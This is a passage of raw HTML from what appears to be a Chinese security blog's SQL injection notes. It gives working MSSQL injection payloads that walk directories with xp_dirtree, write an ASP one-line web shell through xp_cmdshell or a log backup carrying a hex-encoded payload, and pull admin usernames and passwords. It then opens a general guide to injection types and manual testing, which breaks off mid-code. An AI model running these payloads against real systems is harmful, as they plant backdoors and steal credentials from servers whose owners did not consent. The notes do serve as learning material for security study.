接下来，另建一个临时表temp1，用来存放D盘的<span class="hljs-number">1</span>级子目录下的所有目录<br>;<span class="hljs-keyword">create table</span> temp1(dir nvarchar(<span class="hljs-number">255</span>),depth <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-comment">--</span><br># <span class="hljs-number">7.</span> 然后把从D盘的第一个子目录下的所有目录存到temp1中<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@dirname</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>);<span class="hljs-keyword">set</span> <span class="hljs-variable">@dirname</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;D:/&#x27;</span><span class="hljs-operator">+</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> depth<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dir <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;Documents and Settings&#x27;</span>,<span class="hljs-string">&#x27;Program Files&#x27;</span>,<span class="hljs-string">&#x27;RECYCLER&#x27;</span>,<span class="hljs-string">&#x27;System Volume Information&#x27;</span>,<span class="hljs-string">&#x27;WINDOWS&#x27;</span>,<span class="hljs-string">&#x27;CAConfig&#x27;</span>,<span class="hljs-string">&#x27;wmpub&#x27;</span>,<span class="hljs-string">&#x27;Microsoft UAM 卷&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir <span class="hljs-keyword">desc</span>)T <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir);<span class="hljs-keyword">insert into</span> temp1 <span class="hljs-keyword">exec</span> master.dbo.xp_dirtree <span class="hljs-variable">@dirname</span><br># <span class="hljs-number">8.</span> temp1中已经保存了所有D盘第一级子目录下的所有目录,用同样的方法来判断根目录是否在此一级子目录下<br>## 如果返回为真，表示根目录可能在此子目录下，记住要多测试几个例子，如果都返回为假，则表明WEB根目录不在此目录下<br>## 用同样的方法来获得D盘第<span class="hljs-number">2</span>、<span class="hljs-number">3.</span>..个子目录下的所有目录列表，来判断WEB根目录是否在其下。<br>## 要注意，用xp_dirtree前一定要把temp1表中的内容删除。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp1 <span class="hljs-keyword">where</span> dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp1)<br># <span class="hljs-number">9.</span>假设WEB根目录在D盘的第一级子目录下，该子目录名称为website,<br>## 前面我们知道了WEB根目录的深度为<span class="hljs-number">2</span>，我们需要知道website下到底哪个才是真正的WEB根目录。<br>## 用同样的方法，再建立第<span class="hljs-number">3</span>个临时表 temp2<br>;<span class="hljs-keyword">create table</span> temp2(dir nvarchar(<span class="hljs-number">255</span>),depth <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-comment">--</span><br># <span class="hljs-number">10.</span> 然后把从D盘的website下的所有目录存到temp2中<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@dirname</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>);<span class="hljs-keyword">set</span> <span class="hljs-variable">@dirname</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;D:/website/&#x27;</span><span class="hljs-operator">+</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> temp1 <span class="hljs-keyword">where</span> depth<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dir <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;Documents and Settings&#x27;</span>,<span class="hljs-string">&#x27;Program Files&#x27;</span>,<span class="hljs-string">&#x27;RECYCLER&#x27;</span>,<span class="hljs-string">&#x27;System Volume Information&#x27;</span>,<span class="hljs-string">&#x27;WINDOWS&#x27;</span>,<span class="hljs-string">&#x27;CAConfig&#x27;</span>,<span class="hljs-string">&#x27;wmpub&#x27;</span>,<span class="hljs-string">&#x27;Microsoft UAM 卷&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir <span class="hljs-keyword">desc</span>)T <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir);<span class="hljs-keyword">insert into</span> temp2 <span class="hljs-keyword">exec</span> master.dbo.xp_dirtree <span class="hljs-variable">@dirname</span><br># <span class="hljs-number">11.</span>用同样的方法判断该目录是否为根目录<br>## 如果返回为真，为了确定我们的判断，多测试几个例子，方法上面都讲到了，如果多个例子都返回为真，那么就确定了该目录为WEB根目录。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp2 <span class="hljs-keyword">where</span> dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp2)<br>用以上的方法基本上可以获得WEB根目录，现在我们假设WEB根目录是：D:<span class="hljs-operator">/</span>website<span class="hljs-operator">/</span>www<br># <span class="hljs-number">12.</span> 查询临时表中的内容，也就是指定的目录文件和文件夹名。由于不能一次性获取所有目录文件和文件夹名，因此需要更改id的值，依次列出文件和文件夹来。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dir <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="2-获取数据库用户名"><a href="#2-获取数据库用户名" class="headerlink" title="2.获取数据库用户名"></a>2.获取数据库用户名</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.55</span>/sqlserver/<span class="hljs-number">1</span>.aspx?xxser=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> db_name() =O<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="3-写入一句话木马："><a href="#3-写入一句话木马：" class="headerlink" title="3.写入一句话木马："></a>3.写入一句话木马：</h4><p>方法一：一句话木马’（通过中国菜刀）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-number">20</span>;<span class="hljs-keyword">exec</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>master..xp_cmdshell<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-string">&#x27;Echo%20&quot;&lt;%eval%20request(&quot;chopper&quot;)%&gt;&quot;%20&gt;&gt;%20c:\wwwtest\iis-xxser.com--wwwroot\muma.asp&#x27;</span><span class="hljs-comment">--</span><br><br># <span class="hljs-operator">&lt;</span><span class="hljs-operator">%</span>eval<span class="hljs-operator">%</span><span class="hljs-number">20</span>request(&quot;chopper&quot;)<span class="hljs-operator">%</span><span class="hljs-operator">&gt;</span>   是一句话木马，需要根据web的不同而变化<br># c:\wwwtest\iis<span class="hljs-operator">-</span>xxser.com<span class="hljs-comment">--wwwroot\   是路径</span><br># muma.asp   是一句话木马的名字<br></code></pre></td></tr></table></figure><p>方法二：差异备份’（此方法数据库必须曾经备份过事务日志）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">alter</span> database testdb <span class="hljs-keyword">set</span> RECOVERY <span class="hljs-keyword">FULL</span>;<span class="hljs-keyword">create table</span> test_tmp(str image);backup log testdb <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">&#x27;c:\test1&#x27;</span> <span class="hljs-keyword">with</span> init;<span class="hljs-keyword">insert into</span> test_tmp(str) <span class="hljs-keyword">values</span> (<span class="hljs-number">0x3C2565786375746528726571756573742822636D64222929253E</span>);backup log testdb <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\wwwtest\iis-xxser.com--wwwroot\yjh.asp&#x27;</span>;<span class="hljs-keyword">alter</span> database testdb <span class="hljs-keyword">set</span> RECOVERY simple<br><br># (<span class="hljs-number">0x3C2565786375746528726571756573742822636D64222929253E</span>)   是一句话木马的<span class="hljs-number">16</span>进制编码<br># C:\wwwtest\iis<span class="hljs-operator">-</span>xxser.com<span class="hljs-comment">--wwwroot\   是物理路径</span><br># yjh.asp   是一句话木马的名字<br></code></pre></td></tr></table></figure><p>也可以使用工具代替上述操作（GetWebShell）,然后用菜刀连接目标</p><ul><li>地址为：目标的根目录地址然后&#x2F;muma.asp</li><li>密码为：“chopper” 然后就可以进入对方的服务器了。</li></ul><h3 id="第八步：public权限利用方法"><a href="#第八步：public权限利用方法" class="headerlink" title="第八步：public权限利用方法"></a>第八步：public权限利用方法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"># public权限检测<br><span class="hljs-keyword">and</span> db_name()<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">--</span><br># <span class="hljs-number">1.</span>获取mssql所有数据库名和路径<br><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">200</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>top<span class="hljs-operator">%</span><span class="hljs-number">202</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>cast([name]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">as</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>nvarchar(<span class="hljs-number">256</span>))<span class="hljs-operator">%</span><span class="hljs-number">2</span>bchar(<span class="hljs-number">94</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>bcast([filename]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">as</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>nvarchar(<span class="hljs-number">256</span>))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>top<span class="hljs-operator">%</span><span class="hljs-number">202</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>dbid,name,filename<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>[master].[dbo].[sysdatabases]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">order</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">by</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>[dbid])<span class="hljs-operator">%</span><span class="hljs-number">20</span>t<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">order</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">by</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>[dbid]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">desc</span>)<span class="hljs-comment">--</span><br><br># <span class="hljs-number">2.</span>获取当前数据库所有表名<br><span class="hljs-keyword">and</span> <span class="hljs-number">0</span><span class="hljs-operator">&lt;&gt;</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> testdb.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-number">0x7500</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">2</span> name <span class="hljs-keyword">from</span> testdb.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-number">0x7500</span>))<span class="hljs-comment">--</span><br><br># <span class="hljs-number">3.</span>爆表名及字段名<br><span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--  ●爆出了admin.id</span><br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> admin.id <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--  ●又爆出了admin.name</span><br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> admin.id,admin.name <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">-- ●又爆出了admin.passwd</span><br># <span class="hljs-number">4</span>、获取字段内容<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>top<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>isnull(<span class="hljs-built_in">cast</span>([id]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">as</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>nvarchar(<span class="hljs-number">4000</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">32</span>))<span class="hljs-operator">%</span><span class="hljs-number">2</span>bchar(<span class="hljs-number">94</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>bisnull(<span class="hljs-built_in">cast</span>([name]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">as</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>nvarchar(<span class="hljs-number">4000</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">32</span>))<span class="hljs-operator">%</span><span class="hljs-number">2</span>bchar(<span class="hljs-number">94</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>bisnull(<span class="hljs-built_in">cast</span>([password]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">as</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>nvarchar(<span class="hljs-number">4000</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">32</span>))<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">from</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>[testdb]..[admin]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">where</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>id<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">not</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">in</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>top<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">0</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>id<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">from</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>[testdb]..[admin]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">where</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">group</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">by</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>id))<span class="hljs-operator">%</span><span class="hljs-number">3E0</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p>待续</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入笔记</title>
      <link href="/2022/04/23/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/23/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>把sql注入所学到的东西做个总结吧</p><span id="more"></span><h2 id="产生注入的原理和条件"><a href="#产生注入的原理和条件" class="headerlink" title="产生注入的原理和条件"></a>产生注入的原理和条件</h2><h3 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h3><ul><li>官方点的：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span>注入攻击是通过操作输入来修改<span class="hljs-keyword">SQL</span>语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post<span class="hljs-operator">/</span>getweb表单、输入域名或页面请求的查询字符串中插入<span class="hljs-keyword">SQL</span>命令，最终使web服务器执行恶意命令的过程。可以通过一个例子简单说明<span class="hljs-keyword">SQL</span>注入攻击。假设某网站页面显示时URL为http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.example.com?test<span class="hljs-operator">=</span><span class="hljs-number">123</span>，此时URL实际向服务器传递了值为<span class="hljs-number">123</span>的变量test，这表明当前页面是对数据库进行动态查询的结果。由此，我们可以在URL中插入恶意的<span class="hljs-keyword">SQL</span>语句并进行执行。另外，在网站开发过程中，开发人员使用动态字符串构造<span class="hljs-keyword">SQL</span>语句，用来创建所需的应用，这种情况下<span class="hljs-keyword">SQL</span>语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的<span class="hljs-keyword">SQL</span>语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为<span class="hljs-keyword">SQL</span>注入攻击留下了很多的可乘之机。 <span class="hljs-comment">--百度百科</span><br></code></pre></td></tr></table></figure><ul><li><p>自己的理解：</p><ul><li>SQL注入就是输入的恶意语句拼接到了原有语句中，破坏了原有语句的结构，并且被执行。</li></ul></li></ul><h3 id="SQL注入产生的条件"><a href="#SQL注入产生的条件" class="headerlink" title="SQL注入产生的条件"></a>SQL注入产生的条件</h3><ul><li>参数可控：即前端传给后端的参数用户可以控制</li><li>参数带入了数据库并执行：可以简要理解为你输入的恶意语句要被执行</li></ul><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul><li><p>字符型注入  </p><ul><li><code>&#39; or 1=1#</code><br>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</li></ul></li><li><p>数字型注入</p><ul><li><p><code>or 1=1</code><br>当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。</p><blockquote><p>这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，<br>例如，参数id&#x3D;8，PHP会自动推导变量id的数据类型为int类型，那么id&#x3D;8 and 1&#x3D;1，则会推导为string类型，这是弱类型语言的特性。<br>而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。</p></blockquote></li></ul></li><li><p>搜索型注入： </p><ul><li><code>%xxx% or 1=1 #%’</code><br>当在搜索框搜索的时候，称为搜索型。搜索类型一般要使用百分号来闭合。也是字符型的一种</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>（对应值）<span class="hljs-operator">%</span>’; # 源<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>（对应值）<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #<span class="hljs-operator">%</span> <span class="hljs-operator">%</span>’; # 目标<br></code></pre></td></tr></table></figure><h3 id="按照http提交方式"><a href="#按照http提交方式" class="headerlink" title="按照http提交方式"></a>按照http提交方式</h3><ul><li>GET型注入</li><li>POST型注入</li><li>Cookie注入</li></ul><h3 id="按照注入方式分"><a href="#按照注入方式分" class="headerlink" title="按照注入方式分"></a>按照注入方式分</h3><ul><li><p>报错注入</p></li><li><p>盲注</p><ul><li><p>时间盲注</p></li><li><p>bool盲注</p></li></ul></li><li><p>联合注入(union）</p></li><li><p>堆叠注入：有的应用可以加入 <code>;</code> 后一次执行多条语句</p></li><li><p>OOB注入</p></li></ul><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul><li>宽字节注入</li></ul><h2 id="注入常用函数"><a href="#注入常用函数" class="headerlink" title="注入常用函数"></a>注入常用函数</h2><h3 id="基础信息函数"><a href="#基础信息函数" class="headerlink" title="基础信息函数"></a>基础信息函数</h3><table><thead><tr><th align="left">基础信息函数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">system_user()</td><td align="left">系统用户名</td></tr><tr><td align="left">user()</td><td align="left">用户名</td></tr><tr><td align="left">current_user()</td><td align="left">当前用户名</td></tr><tr><td align="left">session_user()</td><td align="left">连接数据库的用户名</td></tr><tr><td align="left">database()</td><td align="left">数据库名</td></tr><tr><td align="left">version()</td><td align="left">数据库版本</td></tr><tr><td align="left">@@datadir</td><td align="left">数据库路径</td></tr><tr><td align="left">@@basedir</td><td align="left">数据库安装路径</td></tr><tr><td align="left">@@version_compile_os</td><td align="left">操作系统</td></tr><tr><td align="left">count()</td><td align="left">返回执行结果数量</td></tr><tr><td align="left">sleep()</td><td align="left">不用解释</td></tr></tbody></table><h3 id="常用处理函数"><a href="#常用处理函数" class="headerlink" title="常用处理函数"></a>常用处理函数</h3><table><thead><tr><th align="left">字符处理函数</th><th align="left">功能</th><th align="left">举例</th></tr></thead><tbody><tr><td align="left"><strong>重点</strong> concat()</td><td align="left">没有分隔符地连接字符串</td><td align="left">select concat(c1,c2) from xxx</td></tr><tr><td align="left"><strong>重点</strong> concat_ws()</td><td align="left">指定分隔符地连接字符串</td><td align="left">select concat_ws(‘:’,c1,c2) from xxx</td></tr><tr><td align="left"><strong>重点</strong> group_concat()</td><td align="left">以逗号分隔某列&#x2F;组的数据</td><td align="left">select group_concat(c1,c2) from xxx</td></tr><tr><td align="left">load_file()</td><td align="left">读取服务器文件</td><td align="left">select loadfile(‘&#x2F;tmp&#x2F;a.txt’)</td></tr><tr><td align="left">into outfile</td><td align="left">写入文件到服务器</td><td align="left">select ‘xxxx’ into outfile ‘&#x2F;tmp&#x2F;a.txt’</td></tr><tr><td align="left">ascii()</td><td align="left">字符串的ASCII代码值</td><td align="left">select ascii(‘a’)</td></tr><tr><td align="left">ord()</td><td align="left">返回字符串第一个字符的ASCII值</td><td align="left">select ord(‘abc’)</td></tr><tr><td align="left">char()</td><td align="left">返回ASCII值对应的字符串</td><td align="left">select char(97)</td></tr><tr><td align="left">mid()</td><td align="left">返回一个字符串的一部分</td><td align="left">select mid(‘abcde’,1,1)</td></tr><tr><td align="left">substr()</td><td align="left">返回一个字符串的一部分</td><td align="left">select substr(‘abcde’,1,1)</td></tr><tr><td align="left">length()</td><td align="left">返回字符串的长度</td><td align="left">select length(‘abc’)</td></tr><tr><td align="left">left()</td><td align="left">返回字符串最左面几个字符</td><td align="left">select left(‘mysql’,2)</td></tr><tr><td align="left">floor()</td><td align="left">返回小于或等于X的最大整数</td><td align="left">select floor(5.1)</td></tr><tr><td align="left">rand()</td><td align="left">返回0-1间的一个随机数</td><td align="left">select rand()</td></tr><tr><td align="left">if()</td><td align="left">三目运算</td><td align="left">select if(1&gt;2,’A’,’B’)</td></tr><tr><td align="left">strcmp()</td><td align="left">比较字符串ASCII大小</td><td align="left">select strcmp(‘c’,’b’)</td></tr><tr><td align="left">ifnull()</td><td align="left">参数1为不null则返回参数1,否则参数2</td><td align="left">select ifnull(null,2)</td></tr></tbody></table><h3 id="常见语言接受参数的函数或变量"><a href="#常见语言接受参数的函数或变量" class="headerlink" title="常见语言接受参数的函数或变量"></a>常见语言接受参数的函数或变量</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-meta"># ASP</span><br>request （全部接受）<br>request.querystring （接受 <span class="hljs-keyword">get</span>）<br>request.form （接受 post）<br>request.cookie（接受 cookie）<br> <br><span class="hljs-meta"># PHP:</span><br><span class="hljs-variable">$_REQUEST</span>（全部接受）<br><span class="hljs-variable">$_GET</span>(接受<span class="hljs-keyword">get</span>)<br><span class="hljs-variable">$_POST</span> （接受 post）<br><span class="hljs-variable">$_COOKIE</span>（接受 cookie） <br><br><span class="hljs-meta">#一般中间件 waf 防火墙，对get防护最高，其次是post，最后是cookie  </span><br><span class="hljs-meta">#很多人在写注入防御代码时，写了post、get的，但是没有过滤cookie的</span><br></code></pre></td></tr></table></figure><h2 id="一般手工注入流程"><a href="#一般手工注入流程" class="headerlink" title="一般手工注入流程"></a>一般手工注入流程</h2><h3 id="注入前准备工作"><a href="#注入前准备工作" class="headerlink" title="注入前准备工作"></a>注入前准备工作</h3><p>也就是信息收集，收集网站架构，所使用的语言，数据库类型，以及web中间件</p><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p>一般在什么url里如：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/xxx.asp?id=xx (ASP 注入)</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/xxx.php?id=xx (php 注入)</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/xxx.jsp?id=xx (jsp 注入)</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/xxx.aspx?id=xx (aspx 注入)</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/index.asp?id=8&amp;page=99 （有多个参数，需要区分用哪个参数来验证注入）</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/index/new/id/8 伪静态</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxxxx.com/index/new/php-8.html 伪静态</span><br></code></pre></td></tr></table></figure><p>还有搜索框、cookie、以及表单提交等任何出现数据交互的地方都有可能出现注入点</p><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>一般两种方法：</p><ul><li><p>单引号法：直接在数据或url后面添加<code>&#39;</code>，如果页面不能正常显示，浏览器返回一些异常信息， 则说明该链接可能存在注入漏洞。</p></li><li><p><code>1=1</code>和<code>1=2</code>法</p><p>很多时候检测提交包含引号的链接时，会提示非法字符，或直接不返回任何信息，这种情况下可以如下尝试：</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 